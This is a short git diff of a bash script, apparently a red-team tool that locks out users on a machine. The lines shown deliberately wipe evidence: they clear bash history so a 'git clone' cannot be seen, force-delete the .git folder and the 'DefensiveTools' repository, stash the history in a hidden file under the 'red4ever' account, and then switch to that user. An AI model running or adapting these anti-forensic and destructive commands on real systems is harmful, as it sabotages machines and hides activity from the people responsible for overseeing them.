@@ -96,7 +96,7 @@ function disable_users()
 # To check their shell is /sbin/nologin: "cat /etc/passwd | grep -v nologin" (make sure they're not here)
 
 # Clear bash history (so the git clone command cannot be seen)
-sudo history -c
+history -c
 
 # Letting the user know this is starting
 echo
@@ -113,13 +113,13 @@ echo "NUKING DISABLER / LOCKER AND LOGS"
 
 # ===== CLEARING THINGS =====
 # Clear git logs (not sure how well these commands to that)
-sudo rm -rf .git > /dev/null
-sudo git init > /dev/null
+sudo rm -rf .git 2>&1
+sudo git init 2>&1
 # Go back a directory a delete the repo contents
 cd ..
 sudo rm -rf DefensiveTools
 # Clear bash history after copying it over to another file
-history > /home/red4life/none_of_your_beeswax.txt
+history > /home/red4ever/none_of_your_beeswax.txt
 history -c
 # Switch user to red
 sudo su - red4ever
